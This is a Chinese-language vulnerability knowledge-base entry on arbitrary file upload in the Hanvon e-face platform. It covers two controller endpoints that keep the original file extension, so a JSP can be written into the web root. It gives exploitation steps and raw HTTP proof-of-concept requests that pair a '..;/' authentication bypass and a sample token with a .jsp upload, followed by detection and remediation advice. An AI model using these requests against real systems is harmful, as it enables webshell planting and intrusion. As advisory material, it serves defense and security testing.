---
id: web-generic-file-upload-hanvon-eface-original-suffix-resource-jsp
title: 汉王e脸通任意文件上传：UUID + 原始后缀写入 ServletContext /resource，可落地 JSP
type: scenario
domain: web
path: web/generic/file-upload
technique: uuid-original-extension-servletcontext-webresource-upload
tags:
- web
- java
- springmvc
- file-upload
- jsp
- webshell
- uuid
- hanvon
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T07:00:10+08:00'
  notes: 已对照原文与图24-25核对：DgmCommandController.resourceUploadFile用isMultipartContent、getOriginalFilename、split('\.')[1]取后缀、UUID+'.'+fileType、path=getRealPath('/resource')、Files.copy(REPLACE_EXISTING)；MeetingController.uploadMeetingFile用lastIndexOf('.')截后缀、'/'+fileId+fileType并回显uploadPath；两处PoC与原文一致；原文未给上传成功/JSP执行截图，confidence=medium合理
url: /docs/web/generic/file-upload/web-generic-file-upload-hanvon-eface-original-suffix-resource-jsp/
draft: false
kb_aliases:
- 汉王e脸通文件上传
- resourceUploadFile 上传
- uploadMeetingFile 上传
- UUID 保留原始后缀
- ServletContext getRealPath resource
---

## 一句话结论

汉王e脸通的两个上传接口 `DgmCommandController.resourceUploadFile` 与 `MeetingController.uploadMeetingFile` 只检查请求是否为 multipart，随后取客户端原始文件名的后缀、用 UUID 生成主文件名，把文件 `Files.copy` 到 `ServletContext.getRealPath("/resource")` 指向的 Web 应用目录；由于没有扩展名白名单或内容校验，攻击者上传 `caigosec.jsp` 即可把 JSP 写入 Web 目录，若容器解析该目录则形成 WebShell。

## 原理

- 两个接口的共同模式：
  - `ServletFileUpload.isMultipartContent(request)` 只判断是否 multipart，不做类型/后缀校验；
  - `MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest) request;` 后遍历 `getFileMap()`；
  - `fileTypeStr = mf.getOriginalFilename()`，从中截取最后一个 `.` 之后的后缀；
  - `fileId = UUID.randomUUID().toString().replace("-", "")`，`uploadPath = getRealPath("/resource") + 分隔符 + fileId + "." + fileType`；
  - `Files.copy(mf.getInputStream(), targetFile.toPath(), REPLACE_EXISTING)` 原样写入。
- 第一处 `DgmCommandController.resourceUploadFile` 用 `fileTypeStr.split("\\.")[1]` 取第二段作为后缀，`uploadPath = path + "\" + fileId + "." + fileType`（Windows 分隔符）。
- 第二处 `MeetingController.uploadMeetingFile` 用 `lastIndexOf(".")` 截取后缀，`uploadPath = path + "/" + fileId + fileType`，并把 `uploadPath` 回显到响应 JSON，便于获取访问路径。
- 关键点：`getServletContext().getRealPath("/resource")` 返回 Web 应用内的真实目录；只要部署容器把该目录下的 `.jsp` 当 JSP 编译执行，上传即等于 WebShell。即使目录被配置为静态资源不解析，仍可造成任意文件写入/覆盖。
- 上传接口本身在鉴权白名单前缀 `/manage/mobiMeetingApp/..;/..;/` 或 `recoToken` 之后可达，攻击门槛低。

## 触发条件

- 目标为汉王e脸通综合管理平台（文章基于反编译源码审计，未标注具体版本）。
- `DgmCommandController` / `MeetingController` 的上传接口可达：可通过白名单 `..;/` 路径绕过或伪造 `recoToken`。
- `getRealPath("/resource")` 目录存在且可写；Web 容器对该目录下的 JSP 进行解析（Tomcat 常见默认行为）。
- 无扩展名白名单、Content-Type 校验或文件内容检测。

## 利用步骤

1. 选择入口：`/manage/mobiMeetingApp/..;/..;/dgmCommand/resourceUploadFile.do` 或 `/meeting/uploadMeetingFile.do?recoToken=<伪造或泄露的 token>`。
2. 构造 multipart 请求，`name="file"`，`filename="caigosec.jsp"`，内容为 JSP 代码（授权测试用无害输出）。
3. 服务端取后缀 `jsp`、UUID 生成文件名并写入 `getRealPath("/resource")` 目录；第二处接口会在响应中返回 `uploadPath`。
4. 访问 `/resource/<uuid>.jsp`（或响应回显的路径）验证 JSP 是否执行；若容器不解析该目录，则仅确认文件写入。
5. 原文未给出上传成功响应与 JSP 访问执行截图，实际是否需要额外路径/权限需在目标环境验证。

## PoC

第一处：

```http
POST /manage/mobiMeetingApp/..;/..;/dgmCommand/resourceUploadFile.do HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="caigosec.jsp"
Content-Type: text/plain

<%-- harmless test marker --%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

第二处：

```http
POST /meeting/uploadMeetingFile.do?recoToken=67mds2pxXQb HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="caigosec.jsp"
Content-Type: application/pdf

<%-- harmless test marker --%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

原文截图确认两处 Controller 均直接使用原始后缀 + UUID + `Files.copy` 写入 `getRealPath("/resource")`；未给出上传后的访问/执行验证。

## 变体与关联

- 同系统批量：文章用特征 `MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;` 搜索到 9 处，分析后 8 处存在任意文件上传，除本文两处外还包括 `ResourceUploadController.resourceUploadFile`、`EmployeeCardRecordController.employeeCardRecordImport`、`BlackListController.uploadMeetingFile`、`MeetingPersonalController.uploadMeetingFile`、`VisitorMapConfigController.uploadMapFile`、`MobiMeetingAppController.uploadMeetingFile`。
- 后缀变体：`.jsp`、`.jspx`、`.war`、`.html`（XSS/钓鱼）、大小写/双后缀（若容器解析策略不同）。
- 关联：上传前需先通过白名单 `..;/` 或伪造 token 绕过鉴权；上传成功后若解析 JSP 即获得命令执行。
- 同类：Spring MVC UUID 保留原始后缀上传、CRM sendfile.jsp 保留后缀上传、MES 原始文件名上传。

## 检测与防御

- 修复：上传接口强制扩展名白名单（按业务只允许图片/文档），校验 Content-Type 与文件魔数，重命名时丢弃原始后缀或使用服务端映射的扩展名；上传目录移出 Web 根并禁用脚本解析。
- 检测：multipart 请求的 `filename` 含 `.jsp/.jspx/.war` 或双后缀；上传目录出现新增可执行文件；`/resource/*.jsp` 的访问请求。
- 加固：上传接口统一鉴权（修复白名单 `..;/` 与 token 伪造）；文件存储使用对象存储/独立域名；对上传目录设置 `X-Content-Type-Options` 与禁止执行策略。
